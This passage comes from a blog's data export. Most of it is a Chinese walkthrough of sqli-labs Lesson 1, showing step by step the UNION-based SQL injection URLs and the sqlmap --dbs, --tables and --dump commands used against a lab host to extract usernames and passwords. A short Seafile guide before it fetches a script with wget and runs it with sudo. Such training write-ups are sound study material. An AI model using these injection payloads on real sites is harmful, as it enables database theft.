class=\"line\">./seahub<span class=\"selector-class\">.sh</span> start</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/seafile/014.png\" alt=\"014\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"seafile个人云盘搭建\"><a href=\"#seafile个人云盘搭建\" class=\"headerlink\" title=\"seafile个人云盘搭建\"></a>seafile个人云盘搭建</h1><h2 id=\"0x01-seafile\"><a href=\"#0x01-seafile\" class=\"headerlink\" title=\"0x01 seafile\"></a>0x01 seafile</h2><p><code>https://github.com/haiwen/seafile</code></p>\n<p><img src=\"/img/seafile/001.png\" alt=\"001\"></p>\n<p>解决的问题:文件同步</p>\n<p><img src=\"/img/seafile/002.png\" alt=\"002\"></p>\n<h2 id=\"0x02-搭建\"><a href=\"#0x02-搭建\" class=\"headerlink\" title=\"0x02 搭建\"></a>0x02 搭建</h2><p><code>https://github.com/helloxz/seafile</code></p>\n<p><img src=\"/img/seafile/003.png\" alt=\"003\"></p>\n<p><code>http://144.202.127.105:8000/d/6aefa7d9d5124d28ba59/#</code></p>\n<p><img src=\"/img/seafile/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/seafile/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/seafile/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/seafile/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/seafile/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/seafile/009.png\" alt=\"009\"></p>\n<h2 id=\"0x03-升级\"><a href=\"#0x03-升级\" class=\"headerlink\" title=\"0x03 升级\"></a>0x03 升级</h2><p><code>https://github.com/neroxps/seafile-server-upgrade</code></p>\n<p><img src=\"/img/seafile/010.png\" alt=\"010\"></p>\n<ol>\n<li>下载脚本到 seafile 程序目录(之前安装的Mycloud目录)</li>\n</ol>\n   <figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https:<span class=\"regexp\">//</span>raw.githubusercontent.com<span class=\"regexp\">/neroxps/</span>seafile-server-upgrade<span class=\"regexp\">/master/</span>seafile_upgrade.sh</span><br></pre></td></tr></table></figure>\n\n<p>   <img src=\"/img/seafile/011.png\" alt=\"011\"></p>\n<ol start=\"2\">\n<li><p>使用root权限运行脚本</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo chmod +x seafile_upgrade.sh</span><br><span class=\"line\">sudo ./seafile_upgrade.sh</span><br><span class=\"line\">#可能还需要</span><br><span class=\"line\">./seafile_upgrade<span class=\"selector-class\">.sh</span> -no_backup</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/seafile/012.png\" alt=\"012\"></p>\n</li>\n</ol>\n<p><img src=\"/img/seafile/013.png\" alt=\"013\"></p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#重启服务</span><br><span class=\"line\">./seafile<span class=\"selector-class\">.sh</span> start</span><br><span class=\"line\">./seahub<span class=\"selector-class\">.sh</span> start</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/seafile/014.png\" alt=\"014\"></p>\n"},{"title":"sqli-labs lession 1 (基于错误的GET单引号字符型注入)","date":"2018-09-18T07:28:52.000Z","_content":"# sqli-labs lession 1 (基于错误的GET单引号字符型注入) #\n---\n## 登录界面 ##\n![001](/img/sql/lesson1/1.PNG)\n## 手注 ##\n\n### 判断注入类型 ###\n>sqli-labs 第一课很人性化地给予提示,在url处添加id。\n\n`http://10.60.250.214/Less-1/?id=1`\n![002](/img/sql/lesson1/2.png)\n\n>由于是get请求方法,以后碰到就直接填写了。\n\n输入单引号\n\n`http://10.60.250.214/Less-1/?id=1'`\n\n![003](/img/sql/lesson1/3.png)\n\n引起报错\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`\n\n根据报错信息,猜测加入的id'参数在SQL语句中应该被对称的单引号包含。\n\n继续验证猜想:\n\n`http://10.60.250.214/Less-1/?id=1' and '1'='1`\n\n页面正常，这里不贴图了\n\n继续检验\n\n`http://10.60.250.214/Less-1/?id=1' and '1'='2`\n\n页面异常\n\n![004](/img/sql/lesson1/4.png)\n\n存在字符型的注入\n\n在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分\n\n\n![005](/img/sql/lesson1/5.png)\n\n\n\n`$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";`\n\n通过get请求提交的数据会被$id接收,举个例子，上图中`1' and '1'='2`就是我手动输入的部分,在SQL语句中就变成这样:\n\n`SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1`\n\n可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。\n\n但是单单这样还是不够的,`and '1'='2' LIMIT 0,1`在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。\n\nmysql的注释方式有以下几种：\n\n* 第一种:#\t\n\n\t\\#在url中编码为`%23`\n\n* 第二种:-- (注意--后面还有个空格)\n\n\t空格的编码是`%20`\n\n* 第三种:--+ \n\n\t第二种的变形,浏览器会把`+`编码成空格\n\n`'`的url编码为`%27`,下面的测试先把单引号用`%27`表示,空格用`%20`表示,#用`%23`,避免出问题。在url中输入如下:\n\n> 第一种:#\n\n`http://10.60.250.214/Less-1/?id=1%27%20%23`\n\n![006](/img/sql/lesson1/6.png)\n\n> 第二种：-- (注意--后面还有个空格)\n\n`http://10.60.250.214/Less-1/?id=1%27%20--%20`\n\n![007](/img/sql/lesson1/7.png)\n\n> 第三种:--+\n\n`http://10.60.250.214/Less-1/?id=1%27%20--+`\n\n![008](/img/sql/lesson1/8.png)\n\n### 猜字段 ###\n\n#### 猜字段数 ####\n\n这里我采用第一种注释方式,当然其他的也可以。\n\n`http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23`\n\n这里我换了个hackbar插件,原来那个有bug\n\n![009](/img/sql/lesson1/9.png)\n\norder by 数字1~3显示的都与这个页面相同,表示至少有3个字段\n\n`http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23`\n\n![010](/img/sql/lesson1/10.png)\n\n图片上的报错信息是:\n\n`SELECT * FROM users WHERE id='1' order by 4#' LIMIT 0,1\nUnknown column '4' in 'order clause'`\n\n说明第4个字段不存在,那就只有3个字段。\n\n#### 猜字段排序 ####\n\n使用union select联合查询,后面接查到的字段个数。如下:\n\n`http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23`\n\n![011](/img/sql/lesson1/11.png)\n\n可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:\n\n![012](/img/sql/lesson1/12.png)\n\n标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。\n\n`http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23`\n\n![013](/img/sql/lesson1/13.png)\n\n显示出id=2的数据信息。\n\n将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23`\n\n![014](/img/sql/lesson1/14.png)\n\n显示出字段顺序,推测字段中排序顺序应该是id,name,password。\n\n### 获取数据库信息 ###\nuser():返回当前数据库连接使用的用户\n\ndatabase():返回当前数据库连接使用的数据库\n\nversion():返回当前数据库的版本\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23`\n\n![015](/img/sql/lesson1/15.png)\n\n### 获取表 ###\n\ngroup_concat函数:将查询到的多行结果连接成字符串\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23`\n\n![016](/img/sql/lesson1/16.png)\n\n### 获取字段 ###\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23`\n\n![017](/img/sql/lesson1/17.png)\n\n### 获取值 ###\n\n`http://10.60.250.214/Less-1/?id=-1' union select 1,2,group_concat(username,':',password) from users%23`\n\n![018](/img/sql/lesson1/18.png)\n\n## SQLMAP ##\n\n### 基础命令 ###\n\nSQLMAP的基础命令如下：\n\n>列举数据库\n\nsqlmap -u “注入地址” -v 1 –-dbs\n\n>当前数据库\n\nsqlmap -u “注入地址” -v 1 –-current-db\n\n>列数据库用户\n\nsqlmap -u “注入地址” -v 1 –-users\n\n\n>当前用户\n\nsqlmap -u “注入地址” -v 1 –-current-user\n\n>列举数据库的表名\n\nsqlmap -u “注入地址” -v 1 -D “数据库” –-tables\n\n>获取表的列名\nsqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns\n\n>获取表中的数据\nsqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump\n\n### 获取数据库 ###\n**-u** \n<font color=#8470FF>\n**指定url** \n</font>\n\n\n**--dbs** \n<font color=#8470FF>\n**爆破数据库** \n</font>\n\n**--batch**\n<font color=#8470FF>\n**默认运行** \n</font>\n\n**--technique**  \n<font color=#8470FF>\n\n指定sqlmap使用的检测技术\n\n* B:Boolean-based-blind  （布尔型型注入）\n\n* E:Error-based   （报错型注入）\n\n* U:Union query-based  （联合注入）\n\n* S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）\n\n* T:Time-based blind  （基于时间延迟注入）\n\n</font>\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" --dbs --batch --technique B`\n\n![020](/img/sql/lesson1/20.png)\n\n![019](/img/sql/lesson1/19.png)\n\n### 获取表 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security --tables`\n\n![022](/img/sql/lesson1/22.png)\n\n![021](/img/sql/lesson1/21.png)\n\n### 获取表的列名 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security -T users --columns`\n\n![24](/img/sql/lesson1/24.png)\n\n![23](/img/sql/lesson1/23.png)\n\n### 获取表中数据 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security -T users --columns --dump`\n\n![26](/img/sql/lesson1/26.png)\n\n![25](/img/sql/lesson1/25.png)","source":"_posts/sqli-labs-lession-1-基于错误的GET单引号字符型注入.md","raw":"---\ntitle: sqli-labs lession 1 (基于错误的GET单引号字符型注入)\ndate: 2018-09-18 15:28:52\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs lession 1 (基于错误的GET单引号字符型注入) #\n---\n## 登录界面 ##\n![001](/img/sql/lesson1/1.PNG)\n## 手注 ##\n\n### 判断注入类型 ###\n>sqli-labs 第一课很人性化地给予提示,在url处添加id。\n\n`http://10.60.250.214/Less-1/?id=1`\n![002](/img/sql/lesson1/2.png)\n\n>由于是get请求方法,以后碰到就直接填写了。\n\n输入单引号\n\n`http://10.60.250.214/Less-1/?id=1'`\n\n![003](/img/sql/lesson1/3.png)\n\n引起报错\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`\n\n根据报错信息,猜测加入的id'参数在SQL语句中应该被对称的单引号包含。\n\n继续验证猜想:\n\n`http://10.60.250.214/Less-1/?id=1' and '1'='1`\n\n页面正常，这里不贴图了\n\n继续检验\n\n`http://10.60.250.214/Less-1/?id=1' and '1'='2`\n\n页面异常\n\n![004](/img/sql/lesson1/4.png)\n\n存在字符型的注入\n\n在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分\n\n\n![005](/img/sql/lesson1/5.png)\n\n\n\n`$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";`\n\n通过get请求提交的数据会被$id接收,举个例子，上图中`1' and '1'='2`就是我手动输入的部分,在SQL语句中就变成这样:\n\n`SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1`\n\n可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。\n\n但是单单这样还是不够的,`and '1'='2' LIMIT 0,1`在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。\n\nmysql的注释方式有以下几种：\n\n* 第一种:#\t\n\n\t\\#在url中编码为`%23`\n\n* 第二种:-- (注意--后面还有个空格)\n\n\t空格的编码是`%20`\n\n* 第三种:--+ \n\n\t第二种的变形,浏览器会把`+`编码成空格\n\n`'`的url编码为`%27`,下面的测试先把单引号用`%27`表示,空格用`%20`表示,#用`%23`,避免出问题。在url中输入如下:\n\n> 第一种:#\n\n`http://10.60.250.214/Less-1/?id=1%27%20%23`\n\n![006](/img/sql/lesson1/6.png)\n\n> 第二种：-- (注意--后面还有个空格)\n\n`http://10.60.250.214/Less-1/?id=1%27%20--%20`\n\n![007](/img/sql/lesson1/7.png)\n\n> 第三种:--+\n\n`http://10.60.250.214/Less-1/?id=1%27%20--+`\n\n![008](/img/sql/lesson1/8.png)\n\n### 猜字段 ###\n\n#### 猜字段数 ####\n\n这里我采用第一种注释方式,当然其他的也可以。\n\n`http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23`\n\n这里我换了个hackbar插件,原来那个有bug\n\n![009](/img/sql/lesson1/9.png)\n\norder by 数字1~3显示的都与这个页面相同,表示至少有3个字段\n\n`http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23`\n\n![010](/img/sql/lesson1/10.png)\n\n图片上的报错信息是:\n\n`SELECT * FROM users WHERE id='1' order by 4#' LIMIT 0,1\nUnknown column '4' in 'order clause'`\n\n说明第4个字段不存在,那就只有3个字段。\n\n#### 猜字段排序 ####\n\n使用union select联合查询,后面接查到的字段个数。如下:\n\n`http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23`\n\n![011](/img/sql/lesson1/11.png)\n\n可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:\n\n![012](/img/sql/lesson1/12.png)\n\n标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。\n\n`http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23`\n\n![013](/img/sql/lesson1/13.png)\n\n显示出id=2的数据信息。\n\n将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23`\n\n![014](/img/sql/lesson1/14.png)\n\n显示出字段顺序,推测字段中排序顺序应该是id,name,password。\n\n### 获取数据库信息 ###\nuser():返回当前数据库连接使用的用户\n\ndatabase():返回当前数据库连接使用的数据库\n\nversion():返回当前数据库的版本\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23`\n\n![015](/img/sql/lesson1/15.png)\n\n### 获取表 ###\n\ngroup_concat函数:将查询到的多行结果连接成字符串\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23`\n\n![016](/img/sql/lesson1/16.png)\n\n### 获取字段 ###\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23`\n\n![017](/img/sql/lesson1/17.png)\n\n### 获取值 ###\n\n`http://10.60.250.214/Less-1/?id=-1' union select 1,2,group_concat(username,':',password) from users%23`\n\n![018](/img/sql/lesson1/18.png)\n\n## SQLMAP ##\n\n### 基础命令 ###\n\nSQLMAP的基础命令如下：\n\n>列举数据库\n\nsqlmap -u “注入地址” -v 1 –-dbs\n\n>当前数据库\n\nsqlmap -u “注入地址” -v 1 –-current-db\n\n>列数据库用户\n\nsqlmap -u “注入地址” -v 1 –-users\n\n\n>当前用户\n\nsqlmap -u “注入地址” -v 1 –-current-user\n\n>列举数据库的表名\n\nsqlmap -u “注入地址” -v 1 -D “数据库” –-tables\n\n>获取表的列名\nsqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns\n\n>获取表中的数据\nsqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump\n\n### 获取数据库 ###\n**-u** \n<font color=#8470FF>\n**指定url** \n</font>\n\n\n**--dbs** \n<font color=#8470FF>\n**爆破数据库** \n</font>\n\n**--batch**\n<font color=#8470FF>\n**默认运行** \n</font>\n\n**--technique**  \n<font color=#8470FF>\n\n指定sqlmap使用的检测技术\n\n* B:Boolean-based-blind  （布尔型型注入）\n\n* E:Error-based   （报错型注入）\n\n* U:Union query-based  （联合注入）\n\n* S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）\n\n* T:Time-based blind  （基于时间延迟注入）\n\n</font>\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" --dbs --batch --technique B`\n\n![020](/img/sql/lesson1/20.png)\n\n![019](/img/sql/lesson1/19.png)\n\n### 获取表 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security --tables`\n\n![022](/img/sql/lesson1/22.png)\n\n![021](/img/sql/lesson1/21.png)\n\n### 获取表的列名 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security -T users --columns`\n\n![24](/img/sql/lesson1/24.png)\n\n![23](/img/sql/lesson1/23.png)\n\n### 获取表中数据 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security -T users --columns --dump`\n\n![26](/img/sql/lesson1/26.png)\n\n![25](/img/sql/lesson1/25.png)","slug":"sqli-labs-lession-1-基于错误的GET单引号字符型注入","published":1,"updated":"2019-06-19T17:23:13.384Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istck001m4dsb0bluyl59","content":"<h1 id=\"sqli-labs-lession-1-基于错误的GET单引号字符型注入\"><a href=\"#sqli-labs-lession-1-基于错误的GET单引号字符型注入\" class=\"headerlink\" title=\"sqli-labs lession 1 (基于错误的GET单引号字符型注入)\"></a>sqli-labs lession 1 (基于错误的GET单引号字符型注入)</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/lesson1/1.PNG\" alt=\"001\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><blockquote>\n<p>sqli-labs 第一课很人性化地给予提示,在url处添加id。</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1</code><br><img src=\"/img/sql/lesson1/2.png\" alt=\"002\"></p>\n<blockquote>\n<p>由于是get请求方法,以后碰到就直接填写了。</p>\n</blockquote>\n<p>输入单引号</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39;</code></p>\n<p><img src=\"/img/sql/lesson1/3.png\" alt=\"003\"></p>\n<p>引起报错<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>根据报错信息,猜测加入的id’参数在SQL语句中应该被对称的单引号包含。</p>\n<p>继续验证猜想:</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;1</code></p>\n<p>页面正常，这里不贴图了</p>\n<p>继续检验</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;2</code></p>\n<p>页面异常</p>\n<p><img src=\"/img/sql/lesson1/4.png\" alt=\"004\"></p>\n<p>存在字符型的注入</p>\n<p>在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分</p>\n<p><img src=\"/img/sql/lesson1/5.png\" alt=\"005\"></p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>\n<p>通过get请求提交的数据会被$id接收,举个例子，上图中<code>1&#39; and &#39;1&#39;=&#39;2</code>就是我手动输入的部分,在SQL语句中就变成这样:</p>\n<p><code>SELECT * FROM users WHERE id=&#39;1&#39; and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code></p>\n<p>可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。</p>\n<p>但是单单这样还是不够的,<code>and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code>在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。</p>\n<p>mysql的注释方式有以下几种：</p>\n<ul>\n<li><p>第一种:#    </p>\n<p>  #在url中编码为<code>%23</code></p>\n</li>\n<li><p>第二种:– (注意–后面还有个空格)</p>\n<p>  空格的编码是<code>%20</code></p>\n</li>\n<li><p>第三种:–+ </p>\n<p>  第二种的变形,浏览器会把<code>+</code>编码成空格</p>\n</li>\n</ul>\n<p><code>&#39;</code>的url编码为<code>%27</code>,下面的测试先把单引号用<code>%27</code>表示,空格用<code>%20</code>表示,#用<code>%23</code>,避免出问题。在url中输入如下:</p>\n<blockquote>\n<p>第一种:#</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20%23</code></p>\n<p><img src=\"/img/sql/lesson1/6.png\" alt=\"006\"></p>\n<blockquote>\n<p>第二种：– (注意–后面还有个空格)</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20--%20</code></p>\n<p><img src=\"/img/sql/lesson1/7.png\" alt=\"007\"></p>\n<blockquote>\n<p>第三种:–+</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20--+</code></p>\n<p><img src=\"/img/sql/lesson1/8.png\" alt=\"008\"></p>\n<h3 id=\"猜字段\"><a href=\"#猜字段\" class=\"headerlink\" title=\"猜字段\"></a>猜字段</h3><h4 id=\"猜字段数\"><a href=\"#猜字段数\" class=\"headerlink\" title=\"猜字段数\"></a>猜字段数</h4><p>这里我采用第一种注释方式,当然其他的也可以。</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23</code></p>\n<p>这里我换了个hackbar插件,原来那个有bug</p>\n<p><img src=\"/img/sql/lesson1/9.png\" alt=\"009\"></p>\n<p>order by 数字1~3显示的都与这个页面相同,表示至少有3个字段</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23</code></p>\n<p><img src=\"/img/sql/lesson1/10.png\" alt=\"010\"></p>\n<p>图片上的报错信息是:</p>\n<p><code>SELECT * FROM users WHERE id=&#39;1&#39; order by 4#&#39; LIMIT 0,1\nUnknown column &#39;4&#39; in &#39;order clause&#39;</code></p>\n<p>说明第4个字段不存在,那就只有3个字段。</p>\n<h4 id=\"猜字段排序\"><a href=\"#猜字段排序\" class=\"headerlink\" title=\"猜字段排序\"></a>猜字段排序</h4><p>使用union select联合查询,后面接查到的字段个数。如下:</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"/img/sql/lesson1/11.png\" alt=\"011\"></p>\n<p>可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:</p>\n<p><img src=\"/img/sql/lesson1/12.png\" alt=\"012\"></p>\n<p>标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。</p>\n<p><code>http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"/img/sql/lesson1/13.png\" alt=\"013\"></p>\n<p>显示出id=2的数据信息。</p>\n<p>将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"/img/sql/lesson1/14.png\" alt=\"014\"></p>\n<p>显示出字段顺序,推测字段中排序顺序应该是id,name,password。</p>\n<h3 id=\"获取数据库信息\"><a href=\"#获取数据库信息\" class=\"headerlink\" title=\"获取数据库信息\"></a>获取数据库信息</h3><p>user():返回当前数据库连接使用的用户</p>\n<p>database():返回当前数据库连接使用的数据库</p>\n<p>version():返回当前数据库的版本</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23</code></p>\n<p><img src=\"/img/sql/lesson1/15.png\" alt=\"015\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p>group_concat函数:将查询到的多行结果连接成字符串</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></p>\n<p><img src=\"/img/sql/lesson1/16.png\" alt=\"016\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23</code></p>\n<p><img src=\"/img/sql/lesson1/17.png\" alt=\"017\"></p>\n<h3 id=\"获取值\"><a href=\"#获取值\" class=\"headerlink\" title=\"获取值\"></a>获取值</h3><p><code>http://10.60.250.214/Less-1/?id=-1&#39; union select 1,2,group_concat(username,&#39;:&#39;,password) from users%23</code></p>\n<p><img src=\"/img/sql/lesson1/18.png\" alt=\"018\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><h3 id=\"基础命令\"><a href=\"#基础命令\" class=\"headerlink\" title=\"基础命令\"></a>基础命令</h3><p>SQLMAP的基础命令如下：</p>\n<blockquote>\n<p>列举数据库</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-dbs</p>\n<blockquote>\n<p>当前数据库</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-current-db</p>\n<blockquote>\n<p>列数据库用户</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-users</p>\n<blockquote>\n<p>当前用户</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-current-user</p>\n<blockquote>\n<p>列举数据库的表名</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 -D “数据库” –-tables</p>\n<blockquote>\n<p>获取表的列名<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns</p>\n</blockquote>\n<blockquote>\n<p>获取表中的数据<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump</p>\n</blockquote>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><p><strong>-u</strong><br><font color=\"#8470FF\"><br><strong>指定url</strong><br></font></p>\n<p><strong>–dbs</strong><br><font color=\"#8470FF\"><br><strong>爆破数据库</strong><br></font></p>\n<p><strong>–batch</strong><br><font color=\"#8470FF\"><br><strong>默认运行</strong><br></font></p>\n<p><strong>–technique</strong><br><font color=\"#8470FF\"></font></p>\n<p>指定sqlmap使用的检测技术</p>\n<ul>\n<li><p>B:Boolean-based-blind  （布尔型型注入）</p>\n</li>\n<li><p>E:Error-based   （报错型注入）</p>\n</li>\n<li><p>U:Union query-based  （联合注入）</p>\n</li>\n<li><p>S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</p>\n</li>\n<li><p>T:Time-based blind  （基于时间延迟注入）</p>\n</li>\n</ul>\n\n\n<p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; --dbs --batch --technique B</code></p>\n<p><img src=\"/img/sql/lesson1/20.png\" alt=\"020\"></p>\n<p><img src=\"/img/sql/lesson1/19.png\" alt=\"019\"></p>\n<h3 id=\"获取表-1\"><a href=\"#获取表-1\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security --tables</code></p>\n<p><img src=\"/img/sql/lesson1/22.png\" alt=\"022\"></p>\n<p><img src=\"/img/sql/lesson1/21.png\" alt=\"021\"></p>\n<h3 id=\"获取表的列名\"><a href=\"#获取表的列名\" class=\"headerlink\" title=\"获取表的列名\"></a>获取表的列名</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns</code></p>\n<p><img src=\"/img/sql/lesson1/24.png\" alt=\"24\"></p>\n<p><img src=\"/img/sql/lesson1/23.png\" alt=\"23\"></p>\n<h3 id=\"获取表中数据\"><a href=\"#获取表中数据\" class=\"headerlink\" title=\"获取表中数据\"></a>获取表中数据</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/lesson1/26.png\" alt=\"26\"></p>\n<p><img src=\"/img/sql/lesson1/25.png\" alt=\"25\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-1-基于错误的GET单引号字符型注入\"><a href=\"#sqli-labs-lession-1-基于错误的GET单引号字符型注入\" class=\"headerlink\" title=\"sqli-labs lession 1 